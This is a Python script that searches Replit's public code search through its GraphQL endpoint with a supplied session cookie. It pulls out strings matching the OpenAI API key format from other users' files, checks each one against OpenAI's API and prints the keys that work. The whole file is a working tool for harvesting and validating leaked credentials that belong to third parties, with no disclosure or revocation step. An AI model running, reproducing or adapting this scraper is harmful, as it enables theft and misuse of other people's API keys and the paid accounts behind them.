import requests
import sys
import re

if len(sys.argv) < 2:
  raise IndexError("Cookie not provided")

cookie = sys.argv[1]
graphql_url = "https://replit.com/graphql"
graphql_headers = {
  "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
  "Accept": "*/*",
  "Accept-Language": "en-US,en;q=0.5",
  "Content-Type": "application/json",
  "x-requested-with": "XMLHttpRequest",
  "Sec-Fetch-Dest": "empty",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Site": "same-origin",
  "Pragma": "no-cache",
  "Cache-Control": "no-cache",
  "Referrer": "https://replit.com/search",
  "Cookie": cookie
}

with open("graphql/SearchPageSearchResults.graphql") as f:
  graphql_query = f.read()

def perform_search(query, page, sort):
  payload = [{
    "operationName": "SearchPageSearchResults",
    "variables": {
      "options": {
        "onlyCalculateHits": False,
        "categories": ["Files"],
        "query": query,
        "categorySettings": {
          "docs": {},
          "files": {
            "page": {
              "first": 10,
              "after": str(page)
            },
            "sort": sort,
            "exactMatch": False,
            "myCode": False
          }
        }
      }
    },
    "query": graphql_query
  }]
  r = requests.post(graphql_url, headers=graphql_headers, json=payload)
  data = r.json()
  if not "fileResults" in data[0]["data"]["search"]:
    return []
  file_results = data[0]["data"]["search"]["fileResults"]["results"]["items"]
  
  found_keys = []
  key_regex = "sk-[a-zA-Z0-9]{48}"
  for result in file_results:
    file_contents = result["fileContents"]
    matches = re.findall(key_regex, file_contents)
    found_keys += matches
  return list(set(found_keys))

def validate_key(key):
  validation_url = "https://api.openai.com/v1/models"
  headers = {
    "Authorization": f"Bearer {key}"
  }
  r = requests.get(validation_url, headers=headers)
  return r.ok

def search_all(query):
  for page in range(1, 21):
    print(f"Checking page {page}")
    keys = perform_search(query, page, "RecentlyModified")
    print(f"Validating keys...")
    for key in keys:
      if validate_key(key):
        print(f"Found working key: {key}")

search_all("sk- openai")